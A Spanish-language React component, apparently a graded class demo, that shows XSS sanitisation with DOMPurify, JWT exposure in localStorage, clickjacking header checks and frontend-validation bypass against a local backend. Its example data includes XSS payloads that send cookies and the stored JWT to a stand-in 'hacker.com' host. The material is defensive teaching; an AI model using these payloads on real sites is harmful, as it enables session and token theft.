import { useContext, useState } from 'react'
import DOMPurify from 'dompurify'
import { AuthContext } from '../contexts/AuthContext'
import './SecurityDemo.css'

export default function SecurityDemo() {
  // ── 1. XSS ──────────────────────────────────────────────────────
  const [xssInput, setXssInput] = useState('')
  const [xssResult, setXssResult] = useState(null)
  const [xssStep, setXssStep] = useState(0)

  const XSS_EXAMPLES = [
    { label: 'Script básico', value: "<script>alert('Hackeado!')</script>" },
    {
      label: 'Robo de cookies',
      value: "<script>fetch('https://hacker.com?c='+document.cookie)</script>",
    },
    { label: 'Imagen con evento', value: '<img src=x onerror="alert(\'XSS\')">' },
    {
      label: 'Robo de token JWT',
      value:
        "<img src=x onerror=\"fetch('https://hacker.com?t='+localStorage.getItem('mg_token'))\">",
    },
    { label: 'Texto normal (seguro)', value: 'Guitarra Fender Stratocaster' },
  ]

  function runXssTest(payload) {
    const input = payload ?? xssInput
    const sanitized = DOMPurify.sanitize(input, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] })
    const isAttack = input !== sanitized
    setXssResult({ input, sanitized, isAttack })
  }

  const { logout } = useContext(AuthContext)

  // ── 2. Storage ──────────────────────────────────────────────────
  const [storageRevealed, setStorageRevealed] = useState(false)
  const token = localStorage.getItem('mg_token')

  // ── 3. Clickjacking ─────────────────────────────────────────────
  const [headersResult, setHeadersResult] = useState(null)
  const [headersLoading, setHeadersLoading] = useState(false)

  async function checkHeaders() {
    setHeadersLoading(true)
    try {
      const res = await fetch('http://localhost:3000/api/health')
      const xFrame = res.headers.get('x-frame-options')
      const csp = res.headers.get('content-security-policy')
      const xContent = res.headers.get('x-content-type-options')
      const referrer = res.headers.get('referrer-policy')
      setHeadersResult({ xFrame, csp, xContent, referrer, ok: true })
    } catch {
      setHeadersResult({ ok: false })
    } finally {
      setHeadersLoading(false)
    }
  }

  // ── 4. Bypass FrontEnd ──────────────────────────────────────────
  const [bypassResult, setBypassResult] = useState(null)
  const [bypassLoading, setBypassLoading] = useState(false)

  async function sendDirectToBackend(payload) {
    setBypassLoading(true)
    setBypassResult(null)
    const tok = localStorage.getItem('mg_token')
    if (!tok) {
      setBypassResult({ error: 'Inicia sesión como Admin primero' })
      setBypassLoading(false)
      return
    }
    try {
      const body = payload ?? {
        nombre: 'A'.repeat(300), // mucho más del límite de 20
        categoria: 'Otro',
        estado: 'Disponible',
      }
      const res = await fetch('http://localhost:3000/api/activos', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${tok}` },
        body: JSON.stringify(body),
      })
      const data = await res.json()
      setBypassResult({ status: res.status, ok: res.ok, data, sent: body, sessionClosed: true })
    } catch (e) {
      setBypassResult({ error: e.message, sessionClosed: true })
    } finally {
      setBypassLoading(false)
      logout()
    }
  }

  return (
    <div className="security-demo">
      <div className="browser-shell">
        <div className="browser-toolbar">
          <div className="browser-controls">
            <span className="browser-dot dot-red" />
            <span className="browser-dot dot-yellow" />
            <span className="browser-dot dot-green" />
          </div>
          <div className="browser-address">https://inventario.local/seguridad</div>
        </div>

        <div className="browser-body">
          <aside className="browser-sidebar">
            <div className="browser-sidebar-title">Pruebas del navegador</div>
            <button className="browser-tab active">XSS</button>
            <button className="browser-tab">Storage</button>
            <button className="browser-tab">Clickjacking</button>
            <button className="browser-tab">Frontend</button>
          </aside>

          <div className="browser-page">
            <div className="security-header">
              <h2>Demostración de seguridad en navegador</h2>
              <p className="security-subtitle">
                Estas pruebas se ejecutan como si fueran parte de una página real del navegador,
                para mostrar cómo se comporta la seguridad en una sesión normal.
              </p>
            </div>

            {/* ═══════════════════════════════════════════════════════════
                SECCIÓN 1 — XSS
            ═══════════════════════════════════════════════════════════ */}
            <div className="sec-card">
              <div className="sec-card-header xss-header">
                <span className="pts-badge">0.2 pts</span>
                <div>
                  <h3>1. Prueba XSS — Cross-Site Scripting</h3>
                  <p>Inserta un script malicioso y observa cómo DOMPurify lo neutraliza</p>
                </div>
              </div>

              <div className="sec-card-body">
                <div className="step-row">
                  <div className="step-num">1</div>
                  <div className="step-content">
                    <p className="step-label">Elige un payload de ataque o escribe el tuyo:</p>
                    <div className="chip-row">
                      {XSS_EXAMPLES.map((ex) => (
                        <button
                          key={ex.label}
                          className={`chip ${xssInput === ex.value ? 'chip-active' : ''}`}
                          onClick={() => {
                            setXssInput(ex.value)
                            setXssStep(1)
                            setXssResult(null)
                          }}
                        >
                          {ex.label}
                        </button>
                      ))}
                    </div>
                    <input
                      className="sec-input"
                      placeholder='O escribe tu propio ataque: <script>alert("XSS")</script>'
                      value={xssInput}
                      onChange={(e) => {
                        setXssInput(e.target.value)
                        setXssStep(1)
                        setXssResult(null)
                      }}
                    />
                  </div>
                </div>

                {xssStep >= 1 && (
                  <div className="step-row">
                    <div className="step-num">2</div>
                    <div className="step-content">
                      <p className="step-label">Simula que el usuario envía el formulario:</p>
                      <button
                        className="sec-btn xss-btn"
                        onClick={() => {
                          setXssStep(2)
                          setTimeout(() => runXssTest(), 400)
                        }}
                      >
                        ⚡ Enviar como si fuera el formulario de Inventario
                      </button>
                      {xssStep === 2 && <div className="typing-anim">🔄 Procesando input...</div>}
                    </div>
                  </div>
                )}

                {xssResult && (
                  <div
                    className={`result-panel ${xssResult.isAttack ? 'blocked-panel' : 'safe-panel'}`}
                  >
                    <div className="result-split">
                      <div className="result-half bad-half">
                        <span className="half-label">❌ Input del atacante:</span>
                        <code className="code-block">{xssResult.input || '(vacío)'}</code>
                        {xssResult.isAttack && (
                          <span className="danger-tag">⚠️ Contiene código malicioso</span>
                        )}
                      </div>
                      <div className="result-half good-half">
                        <span className="half-label">✅ Después de DOMPurify:</span>
                        <code className="code-block">
                          {xssResult.sanitized || '(eliminado completamente)'}
                        </code>
                        {xssResult.isAttack && (
                          <span className="safe-tag">🛡️ Script eliminado — inofensivo</span>
                        )}
                      </div>
                    </div>
                    <div
                      className={`verdict ${xssResult.isAttack ? 'verdict-blocked' : 'verdict-ok'}`}
                    >
                      {xssResult.isAttack
                        ? '🛡️ ATAQUE BLOQUEADO — DOMPurify neutralizó el script antes de llegar al backend'
                        : '✅ Input limpio — No se detectó contenido malicioso'}
                    </div>
                  </div>
                )}
              </div>
            </div>

            {/* ═══════════════════════════════════════════════════════════
                SECCIÓN 2 — STORAGE
            ═══════════════════════════════════════════════════════════ */}
            <div className="sec-card">
              <div className="sec-card-header storage-header">
                <span className="pts-badge">0.1 pts</span>
                <div>
                  <h3>2. Seguridad del Almacenamiento Local (localStorage)</h3>
                  <p>Muestra dónde está guardado el token JWT y por qué es vulnerable</p>
                </div>
              </div>

              <div className="sec-card-body">
                <div className="storage-grid">
                  <div className="storage-col">
                    <button
                      className="sec-btn storage-btn"
                      onClick={() => setStorageRevealed(true)}
                    >
                      🔍 Revelar datos en localStorage
                    </button>
                    {storageRevealed && (
                      <div className="storage-reveal">
                        <div className="storage-item">
                          <span className="storage-key">mg_token</span>
                          <span className="storage-value">
                            {token
                              ? `${token.substring(0, 50)}...`
                              : '⚠️ Sin sesión activa — inicia sesión primero'}
                          </span>
                        </div>
                        <div className="storage-item">
                          <span className="storage-key">Accesible por JS</span>
                          <span className="storage-value danger">SÍ ← Vulnerabilidad</span>
                        </div>
                        <div className="attack-box">
                          <p className="attack-title">
                            ⚠️ Así robaría el token un atacante XSS exitoso:
                          </p>
                          <code className="attack-code">
                            {`fetch('https://hacker.com/steal?t=' + localStorage.getItem('mg_token'))`}
                          </code>
                        </div>
                      </div>
                    )}
                  </div>
                  <div className="storage-col">
                    <div className="comparison-table">
                      <div className="compare-header">Comparación de almacenamiento</div>
                      <div className="compare-row">
                        <div className="compare-cell header-cell">Característica</div>
                        <div className="compare-cell bad-cell">localStorage ❌</div>
                        <div className="compare-cell good-cell">Cookie HttpOnly ✅</div>
                      </div>
                      <div className="compare-row">
                        <div className="compare-cell">Accesible por JS</div>
                        <div className="compare-cell bad-cell">SÍ</div>
                        <div className="compare-cell good-cell">NO</div>
                      </div>
                      <div className="compare-row">
                        <div className="compare-cell">Vulnerable a XSS</div>
                        <div className="compare-cell bad-cell">SÍ</div>
                        <div className="compare-cell good-cell">NO</div>
                      </div>
                      <div className="compare-row">
                        <div className="compare-cell">HttpOnly</div>
                        <div className="compare-cell bad-cell">N/A</div>
                        <div className="compare-cell good-cell">✅ true</div>
                      </div>
                      <div className="compare-row">
                        <div className="compare-cell">Secure (HTTPS)</div>
                        <div className="compare-cell bad-cell">N/A</div>
                        <div className="compare-cell good-cell">✅ true</div>
                      </div>
                      <div className="compare-row">
                        <div className="compare-cell">SameSite</div>
                        <div className="compare-cell bad-cell">N/A</div>
                        <div className="compare-cell good-cell">✅ Strict</div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* ═══════════════════════════════════════════════════════════
                SECCIÓN 3 — CLICKJACKING
            ═══════════════════════════════════════════════════════════ */}
            <div className="sec-card">
              <div className="sec-card-header click-header">
                <span className="pts-badge">0.2 pts</span>
                <div>
                  <h3>3. Clickjacking & Content Security Policy</h3>
                  <p>
                    Verifica que el backend bloquea que la app sea embebida en un iframe malicioso
                  </p>
                </div>
              </div>

              <div className="sec-card-body">
                <div className="click-grid">
                  <div>
                    <p className="step-label">¿Qué hace un atacante de Clickjacking?</p>
                    <div className="attack-scenario">
                      <div className="scenario-step">
                        <span className="scenario-num">1</span>
                        <span>El atacante crea una página web falsa de phishing</span>
                      </div>
                      <div className="scenario-step">
                        <span className="scenario-num">2</span>
                        <span>
                          Embebe la app real dentro de un <code>&lt;iframe&gt;</code> invisible
                        </span>
                      </div>
                      <div className="scenario-step">
                        <span className="scenario-num">3</span>
                        <span>
                          La víctima cree que hace clic en el sitio falso pero en realidad
                          interactúa con la app real
                        </span>
                      </div>
                      <div className="scenario-step">
                        <span className="scenario-num">4</span>
                        <span>
                          El atacante obtiene credenciales o ejecuta acciones no autorizadas
                        </span>
                      </div>
                    </div>

                    <button
                      className="sec-btn click-btn"
                      onClick={checkHeaders}
                      disabled={headersLoading}
                    >
                      {headersLoading ? '🔄 Verificando...' : '🛡️ Verificar protección del backend'}
                    </button>

                    {headersResult && (
                      <div className="headers-result">
                        {headersResult.ok ? (
                          <>
                            <div className="header-row">
                              <span className="header-name">X-Frame-Options</span>
                              <span
                                className={`header-val ${headersResult.xFrame === 'DENY' ? 'val-ok' : 'val-bad'}`}
                              >
                                {headersResult.xFrame || 'No configurado'}
                              </span>
                              {headersResult.xFrame === 'DENY' && <span className="check">✅</span>}
                            </div>
                            <div className="header-row">
                              <span className="header-name">Content-Security-Policy</span>
                              <span className="header-val val-ok" style={{ fontSize: '0.72rem' }}>
                                {headersResult.csp || 'No configurado'}
                              </span>
                              {headersResult.csp && <span className="check">✅</span>}
                            </div>
                            <div className="header-row">
                              <span className="header-name">X-Content-Type-Options</span>
                              <span
                                className={`header-val ${headersResult.xContent ? 'val-ok' : 'val-bad'}`}
                              >
                                {headersResult.xContent || 'No configurado'}
                              </span>
                              {headersResult.xContent && <span className="check">✅</span>}
                            </div>
                            <div className="verdict verdict-blocked">
                              ✅ PROTEGIDO — El backend rechaza cualquier intento de iframe
                            </div>
                          </>
                        ) : (
                          <div className="verdict verdict-error">
                            ⚠️ No se pudo conectar al backend
                          </div>
                        )}
                      </div>
                    )}
                  </div>

                  <div>
                    <p className="step-label">Resumen del ataque:</p>
                    <div className="click-explanation">
                      <p>
                        Un atacante intenta incrustar la aplicación dentro de una página falsa para
                        que el usuario haga clic sin darse cuenta.
                      </p>
                      <ul className="plain-list">
                        <li>La página maliciosa se muestra como un sitio normal.</li>
                        <li>La app real se carga en segundo plano dentro del iframe.</li>
                        <li>La protección del backend debe impedir esa carga.</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* ═══════════════════════════════════════════════════════════
                SECCIÓN 4 — BYPASS FRONTEND
            ═══════════════════════════════════════════════════════════ */}
            <div className="sec-card">
              <div className="sec-card-header bypass-header">
                <span className="pts-badge">0.2 pts</span>
                <div>
                  <h3>4. Desmitificar la &ldquo;Seguridad&rdquo; del FrontEnd</h3>
                  <p>
                    Demuestra que las validaciones del navegador pueden bypassearse, pero el backend
                    resiste
                  </p>
                </div>
              </div>

              <div className="sec-card-body">
                <div className="bypass-demo">
                  <div className="flow-text">
                    <p className="step-label">Flujo simple del ataque:</p>
                    <ol className="plain-list">
                      <li>
                        El atacante envía datos propios o manipula la petición desde el navegador.
                      </li>
                      <li>El frontend solo ayuda a validar, pero no es la protección real.</li>
                      <li>El backend decide si acepta o rechaza la acción.</li>
                    </ol>
                  </div>

                  <div className="bypass-steps">
                    <div className="step-row">
                      <div className="step-num">1</div>
                      <div className="step-content">
                        <p className="step-label">
                          Límite NORMAL del campo "Nombre" en el formulario:
                        </p>
                        <div className="limit-demo">
                          <div className="limit-bar">
                            <div className="limit-fill" style={{ width: '100%' }} />
                          </div>
                          <span className="limit-text">
                            Máximo: 20 caracteres (aplicado por el FrontEnd)
                          </span>
                        </div>
                      </div>
                    </div>

                    <div className="step-row">
                      <div className="step-num">2</div>
                      <div className="step-content">
                        <p className="step-label">
                          Simula un atacante que saltea el FrontEnd con código propio:
                        </p>
                        <div className="bypass-options">
                          <button
                            className="sec-btn bypass-btn"
                            onClick={() =>
                              sendDirectToBackend({
                                nombre: 'A'.repeat(300),
                                categoria: 'Otro',
                                estado: 'Disponible',
                              })
                            }
                            disabled={bypassLoading}
                          >
                            {bypassLoading
                              ? '⏳ Enviando...'
                              : '🚀 Enviar 300 caracteres (bypass maxLength)'}
                          </button>
                          <button
                            className="sec-btn bypass-btn"
                            onClick={() =>
                              sendDirectToBackend({
                                nombre: "<script>alert('xss')</script>",
                                categoria: 'Otro',
                                estado: 'Disponible',
                              })
                            }
                            disabled={bypassLoading}
                          >
                            {bypassLoading ? '⏳ Enviando...' : '💉 Enviar XSS directo al backend'}
                          </button>
                          <button
                            className="sec-btn bypass-btn"
                            onClick={() =>
                              sendDirectToBackend({
                                nombre: '',
                                categoria: 'Otro',
                                estado: 'Disponible',
                              })
                            }
                            disabled={bypassLoading}
                          >
                            {bypassLoading
                              ? '⏳ Enviando...'
                              : '🕳️ Enviar campo vacío (bypass required)'}
                          </button>
                        </div>
                        <div className="bypass-actions">
                          <button className="sec-btn logout-btn" onClick={() => logout()}>
                            🔒 Cerrar sesión inmediatamente
                          </button>
                        </div>
                      </div>
                    </div>

                    {bypassResult && (
                      <div className="step-row">
                        <div className="step-num">3</div>
                        <div className="step-content">
                          <p className="step-label">Resultado del backend:</p>
                          {bypassResult.error ? (
                            <div className="result-panel blocked-panel">
                              <div className="verdict verdict-error">⚠️ {bypassResult.error}</div>
                            </div>
                          ) : (
                            <div
                              className={`result-panel ${bypassResult.ok ? 'warning-panel' : 'blocked-panel'}`}
                            >
                              <div className="result-split">
                                <div className="result-half">
                                  <span className="half-label">Datos enviados al backend:</span>
                                  <code className="code-block">
                                    nombre: &quot;
                                    {String(bypassResult.sent?.nombre).substring(0, 60)}&quot;
                                    {bypassResult.sent?.nombre?.length > 60
                                      ? `... (+${bypassResult.sent.nombre.length - 60} más)`
                                      : ''}
                                    <br />
                                    longitud: {bypassResult.sent?.nombre?.length} caracteres
                                  </code>
                                </div>
                                <div className="result-half">
                                  <span className="half-label">
                                    Respuesta del backend (HTTP {bypassResult.status}):
                                  </span>
                                  <code className="code-block">
                                    {bypassResult.data?.message ||
                                      JSON.stringify(bypassResult.data)}
                                  </code>
                                </div>
                              </div>
                              <div
                                className={`verdict ${bypassResult.ok ? 'verdict-warning' : 'verdict-blocked'}`}
                              >
                                {bypassResult.ok
                                  ? '⚠️ El backend aceptó el dato — se debería agregar validación en el servidor'
                                  : '✅ BACKEND BLOQUEÓ EL ATAQUE — La validación del servidor funcionó correctamente'}
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
